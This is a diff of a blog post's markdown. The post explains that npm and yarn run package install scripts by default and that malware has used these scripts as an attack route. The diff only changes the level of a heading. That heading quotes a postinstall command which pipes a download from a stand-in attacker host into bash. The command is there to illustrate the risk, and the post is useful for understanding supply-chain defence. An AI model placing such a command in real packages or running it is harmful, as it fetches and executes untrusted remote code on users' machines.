@@ -9,7 +9,7 @@ Today, GitHub published [a write-up on a number of CVEs](https://github.blog/202
 
 This sounds pretty scary: "arbitrary file overwrites and subsequent code execution" is the kind of phrase that you don't want to see in a CVE description. The problem is that by default, npm allows this to happen anyway.
 
-# postinstall: "curl evil.com | bash"
+## postinstall: "curl evil.com | bash"
 
 npm (and yarn) will execute arbitrary code when you install a package via [install scripts](https://docs.npmjs.com/cli/v7/using-npm/scripts#npm-install). A valid use-case is to build native code on installation, or do some other environment-specific setup, though these scripts have also been used to [show ads](https://www.zdnet.com/article/npm-bans-terminal-ads/) and, of course, as an [attack](https://blog.sonatype.com/bladabindi-njrat-rat-in-jdb.js-npm-malware) [vector](https://snyk.io/blog/npm-security-malicious-code-in-oss-npm-packages/). In fact, install scripts [were the most popular route for malware](https://blog.npmjs.org/post/188385634100/npm-security-insights-api-preview-part-2-malware) as of 2019[^2].
 
